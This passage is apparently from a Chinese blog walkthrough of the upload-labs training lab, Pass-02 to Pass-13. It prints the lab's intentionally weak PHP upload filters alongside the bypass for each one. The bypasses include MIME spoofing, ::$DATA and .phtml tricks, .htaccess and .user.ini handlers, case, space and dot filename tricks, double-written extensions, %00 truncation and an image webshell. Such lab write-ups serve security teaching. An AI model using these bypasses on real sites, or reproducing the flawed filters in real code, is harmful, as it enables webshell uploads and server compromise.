punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>MIME类型检查</strong></p><blockquote><p>媒体类型（Multipurpose Internet Maile Extensions 或 MIME类型）是一种标准，用来表示文档、文件或字节流的性质和格式。</p><p>MIME的组成：<strong>类型/子类型</strong>        <strong>type/subtype</strong></p><p>​    </p><p>常见的MIME类型<br>　　超文本标记语言文本 .html,.html <strong>text/html</strong><br>　　普通文本 .txt <strong>text/plain</strong><br>　　RTF文本 .rtf <strong>application/rtf</strong><br>　　GIF图形 .gif <strong>image/gif</strong><br>　　JPEG图形 .jpeg,.jpg <strong>image/jpeg</strong><br>　　GZIP文件 .gz <strong>application/x-gzip</strong><br>　　TAR文件 .tar **application/x-tar</p></blockquote><p>上传抓包修改<strong>Content-Type: application/octet-stream</strong></p><p>为<strong>Content-Type: image/png</strong>放包即可</p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p><p>例如:<code>&quot;phpinfo.php::$DATA&quot;</code>Windows会自动去掉末尾的<code>::$DATA</code>变成<code>&quot;phpinfo.php&quot;</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.asp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.aspx'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//白名单</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//trim去除首尾空格</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//返回.之后的字符串</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>httpd.conf</code>中：</p><p><code>AddType application/x-httpd-php .php .php3 .phtml</code></p><p>所以将后缀改为<code>.phtml</code>即可</p><p>另一种解法：双写<code>::$DATA</code></p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pHp1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//黑名单</span></code></pre><p>不过<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>还可双写<code>::$DATA</code></p><hr><p><code>.htaccess</code></p><p>要想<code>.htaccess</code>文件生效需要:<code>1. Apache配置文件中：AllowOverride All</code>;<code>2. Apache 要加载mod_Rewrite模块</code></p><p><code>.htaccess</code>中写入<code>SetHandler application/x-httpd-php </code>,这句话将所有文件解析为PHP文件。</p><p>然后将马后缀改为黑名单之外的即可</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这次黑名单加了<code>.htaccess</code></p><p>源码中少了<code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>可以大小写绕过`test.PhP</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>源码中少了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span></code></pre><p>所以加空格绕过</p><p><code>test.php </code></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>没有</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span></code></pre><p><code>test.php.</code></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span></code></pre><p>文件名加<code>::$DATA</code>即可</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p><code>.user.ini</code></p><p>是PHP的一种配置文件</p><p>使用条件：</p><p>(1)服务器脚本语言为PHP<br>(2)对应目录下面有可执行的php文件<br>(3)服务器使用CGI／FastCGI模式 </p><p><code>auto_prepend_file=1.gif</code></p><h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>双写绕过</p><p><code>test.pphphp</code></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre><p><code>save_path</code>可控</p><p><code>%00</code>截断</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172350068.png"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre><p>get改为POST</p><p>POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172350999.png"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p><code>任务</code></p><p>上传<code>图片马</code>到服务器。</p><p>注意：</p><p>1.保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码。</p><p>2.使用<a href="http://127.0.0.1/include.php">文件包含漏洞</a>能运行图片马中的恶意代码。</p><p>3.图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'chars1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'png'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'gif'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'unknown'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_type</span> <span class="token operator">=</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_type</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string 